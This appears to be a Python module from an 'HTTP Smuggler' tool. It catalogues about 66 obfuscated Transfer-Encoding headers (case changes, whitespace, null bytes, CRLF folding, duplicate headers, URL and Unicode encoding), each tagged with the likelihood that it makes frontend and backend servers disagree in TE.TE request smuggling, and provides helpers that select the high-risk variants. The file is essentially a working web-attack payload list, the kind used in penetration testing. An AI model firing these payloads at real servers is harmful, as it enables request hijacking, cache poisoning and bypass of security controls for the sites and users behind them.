"""Transfer-Encoding obfuscation mutations for HTTP Smuggler.

Contains 50+ variations of the Transfer-Encoding header that may be
interpreted differently by frontend and backend servers, enabling
TE.TE smuggling attacks.
"""

from enum import Enum
from typing import List, Dict, Optional
from dataclasses import dataclass


class ObfuscationCategory(Enum):
    """Categories of Transfer-Encoding obfuscation."""
    CAPITALIZATION = "capitalization"
    WHITESPACE = "whitespace"
    VALUE_MUTATION = "value_mutation"
    SPECIAL_CHARS = "special_chars"
    DUPLICATE = "duplicate"
    HEADER_NAME = "header_name"
    ENCODING = "encoding"
    NEWLINE = "newline"


@dataclass
class TEObfuscation:
    """A single Transfer-Encoding obfuscation variant."""
    header: str                    # The full header line (or lines for duplicates)
    category: ObfuscationCategory  # Category of obfuscation
    description: str               # Human-readable description
    risk_level: str = "medium"     # low, medium, high (likelihood of bypass)
    
    def __str__(self) -> str:
        return self.header


# ============================================================================
# Transfer-Encoding Obfuscations (50+)
# ============================================================================

TE_OBFUSCATIONS: List[TEObfuscation] = [
    # -------------------------------------------------------------------------
    # Capitalization Variants (10)
    # -------------------------------------------------------------------------
    TEObfuscation(
        header="Transfer-Encoding: chunked",
        category=ObfuscationCategory.CAPITALIZATION,
        description="Standard capitalization (baseline)",
        risk_level="low",
    ),
    TEObfuscation(
        header="transfer-encoding: chunked",
        category=ObfuscationCategory.CAPITALIZATION,
        description="All lowercase",
        risk_level="medium",
    ),
    TEObfuscation(
        header="TRANSFER-ENCODING: chunked",
        category=ObfuscationCategory.CAPITALIZATION,
        description="All uppercase",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-encoding: chunked",
        category=ObfuscationCategory.CAPITALIZATION,
        description="Lowercase after hyphen",
        risk_level="medium",
    ),
    TEObfuscation(
        header="transfer-Encoding: chunked",
        category=ObfuscationCategory.CAPITALIZATION,
        description="Uppercase after hyphen",
        risk_level="medium",
    ),
    TEObfuscation(
        header="tRaNsFeR-eNcOdInG: chunked",
        category=ObfuscationCategory.CAPITALIZATION,
        description="Alternating case",
        risk_level="high",
    ),
    TEObfuscation(
        header="TrAnSfEr-EnCoDiNg: chunked",
        category=ObfuscationCategory.CAPITALIZATION,
        description="Inverse alternating case",
        risk_level="high",
    ),
    TEObfuscation(
        header="TRANSFER-encoding: chunked",
        category=ObfuscationCategory.CAPITALIZATION,
        description="First word uppercase",
        risk_level="medium",
    ),
    TEObfuscation(
        header="transfer-ENCODING: chunked",
        category=ObfuscationCategory.CAPITALIZATION,
        description="Second word uppercase",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: CHUNKED",
        category=ObfuscationCategory.CAPITALIZATION,
        description="Uppercase value",
        risk_level="medium",
    ),
    
    # -------------------------------------------------------------------------
    # Whitespace Variants (12)
    # -------------------------------------------------------------------------
    TEObfuscation(
        header="Transfer-Encoding : chunked",
        category=ObfuscationCategory.WHITESPACE,
        description="Space before colon",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding:  chunked",
        category=ObfuscationCategory.WHITESPACE,
        description="Double space after colon",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding:\tchunked",
        category=ObfuscationCategory.WHITESPACE,
        description="Tab after colon",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding:chunked",
        category=ObfuscationCategory.WHITESPACE,
        description="No space after colon",
        risk_level="medium",
    ),
    TEObfuscation(
        header=" Transfer-Encoding: chunked",
        category=ObfuscationCategory.WHITESPACE,
        description="Leading space before header",
        risk_level="high",
    ),
    TEObfuscation(
        header="\tTransfer-Encoding: chunked",
        category=ObfuscationCategory.WHITESPACE,
        description="Leading tab before header",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked ",
        category=ObfuscationCategory.WHITESPACE,
        description="Trailing space after value",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked\t",
        category=ObfuscationCategory.WHITESPACE,
        description="Trailing tab after value",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding:   chunked",
        category=ObfuscationCategory.WHITESPACE,
        description="Triple space after colon",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding:\t\tchunked",
        category=ObfuscationCategory.WHITESPACE,
        description="Double tab after colon",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: \tchunked",
        category=ObfuscationCategory.WHITESPACE,
        description="Space then tab after colon",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding:\t chunked",
        category=ObfuscationCategory.WHITESPACE,
        description="Tab then space after colon",
        risk_level="high",
    ),
    
    # -------------------------------------------------------------------------
    # Value Mutation Variants (12)
    # -------------------------------------------------------------------------
    TEObfuscation(
        header="Transfer-Encoding: xchunked",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Prefix x before chunked",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunkedx",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Suffix x after chunked",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked-false",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Suffix -false",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunkedchunked",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Double chunked value",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked, identity",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Chunked with identity",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: identity, chunked",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Identity before chunked",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked; foo=bar",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Chunked with parameter",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked; q=0.5",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Chunked with quality parameter",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: ,chunked",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Leading comma",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked,",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Trailing comma",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked,,",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Double trailing comma",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: ,,chunked",
        category=ObfuscationCategory.VALUE_MUTATION,
        description="Double leading comma",
        risk_level="high",
    ),
    
    # -------------------------------------------------------------------------
    # Special Character Variants (10)
    # -------------------------------------------------------------------------
    TEObfuscation(
        header="Transfer-Encoding: chunked\x00",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="Null byte at end",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chu\x00nked",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="Null byte in value",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding\x00: chunked",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="Null byte after header name",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked\x0b",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="Vertical tab at end",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked\x0c",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="Form feed at end",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked\x1f",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="Unit separator at end",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked\x7f",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="DEL character at end",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding:\x0bchunked",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="Vertical tab before value",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding:\x0cchunked",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="Form feed before value",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer\x00-Encoding: chunked",
        category=ObfuscationCategory.SPECIAL_CHARS,
        description="Null byte in header name",
        risk_level="high",
    ),
    
    # -------------------------------------------------------------------------
    # Header Name Variants (6)
    # -------------------------------------------------------------------------
    TEObfuscation(
        header="Transfer_Encoding: chunked",
        category=ObfuscationCategory.HEADER_NAME,
        description="Underscore instead of hyphen",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer.Encoding: chunked",
        category=ObfuscationCategory.HEADER_NAME,
        description="Dot instead of hyphen",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer\tEncoding: chunked",
        category=ObfuscationCategory.HEADER_NAME,
        description="Tab in header name",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer Encoding: chunked",
        category=ObfuscationCategory.HEADER_NAME,
        description="Space instead of hyphen",
        risk_level="high",
    ),
    TEObfuscation(
        header="TransferEncoding: chunked",
        category=ObfuscationCategory.HEADER_NAME,
        description="No hyphen",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer--Encoding: chunked",
        category=ObfuscationCategory.HEADER_NAME,
        description="Double hyphen",
        risk_level="high",
    ),
    
    # -------------------------------------------------------------------------
    # Newline/CRLF Variants (6)
    # -------------------------------------------------------------------------
    TEObfuscation(
        header="Transfer-Encoding: chunked\r\n\r\n",
        category=ObfuscationCategory.NEWLINE,
        description="Extra CRLF at end",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding:\n chunked",
        category=ObfuscationCategory.NEWLINE,
        description="LF continuation",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding:\r\n chunked",
        category=ObfuscationCategory.NEWLINE,
        description="CRLF continuation (folding)",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked\n",
        category=ObfuscationCategory.NEWLINE,
        description="LF only line ending",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked\r",
        category=ObfuscationCategory.NEWLINE,
        description="CR only line ending",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding\r: chunked",
        category=ObfuscationCategory.NEWLINE,
        description="CR before colon",
        risk_level="high",
    ),
    
    # -------------------------------------------------------------------------
    # Duplicate Header Variants (6)
    # -------------------------------------------------------------------------
    TEObfuscation(
        header="Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
        category=ObfuscationCategory.DUPLICATE,
        description="Chunked then identity",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",
        category=ObfuscationCategory.DUPLICATE,
        description="Identity then chunked",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked",
        category=ObfuscationCategory.DUPLICATE,
        description="Double chunked headers",
        risk_level="medium",
    ),
    TEObfuscation(
        header="Transfer-Encoding: \r\nTransfer-Encoding: chunked",
        category=ObfuscationCategory.DUPLICATE,
        description="Empty then chunked",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
        category=ObfuscationCategory.DUPLICATE,
        description="Invalid then chunked",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        category=ObfuscationCategory.DUPLICATE,
        description="Chunked then invalid",
        risk_level="high",
    ),
    
    # -------------------------------------------------------------------------
    # Encoding/Unicode Variants (4)
    # -------------------------------------------------------------------------
    TEObfuscation(
        header="Transfer-Encoding: \u0063hunked",
        category=ObfuscationCategory.ENCODING,
        description="Unicode c in chunked",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: %63hunked",
        category=ObfuscationCategory.ENCODING,
        description="URL-encoded c in chunked",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chun\u006bed",
        category=ObfuscationCategory.ENCODING,
        description="Unicode k in chunked",
        risk_level="high",
    ),
    TEObfuscation(
        header="Transfer-Encoding: chun%6bed",
        category=ObfuscationCategory.ENCODING,
        description="URL-encoded k in chunked",
        risk_level="high",
    ),
]


def get_te_mutations() -> List[str]:
    """Get list of all TE obfuscation header strings.
    
    Returns:
        List of header strings
    """
    return [te.header for te in TE_OBFUSCATIONS]


def get_te_mutations_by_category(
    category: Optional[ObfuscationCategory] = None,
    risk_level: Optional[str] = None,
) -> List[TEObfuscation]:
    """Get TE obfuscations filtered by category and/or risk level.
    
    Args:
        category: Optional category filter
        risk_level: Optional risk level filter (low, medium, high)
    
    Returns:
        Filtered list of obfuscations
    """
    result = TE_OBFUSCATIONS
    
    if category is not None:
        result = [te for te in result if te.category == category]
    
    if risk_level is not None:
        result = [te for te in result if te.risk_level == risk_level]
    
    return result


def get_high_risk_mutations() -> List[TEObfuscation]:
    """Get only high-risk obfuscations (most likely to cause desync).
    
    Returns:
        List of high-risk obfuscations
    """
    return get_te_mutations_by_category(risk_level="high")


def get_obfuscation_count() -> int:
    """Get total number of obfuscations.
    
    Returns:
        Number of obfuscations
    """
    return len(TE_OBFUSCATIONS)


def get_categories_summary() -> Dict[ObfuscationCategory, int]:
    """Get count of obfuscations per category.
    
    Returns:
        Dict mapping category to count
    """
    summary = {}
    for category in ObfuscationCategory:
        summary[category] = len(get_te_mutations_by_category(category))
    return summary

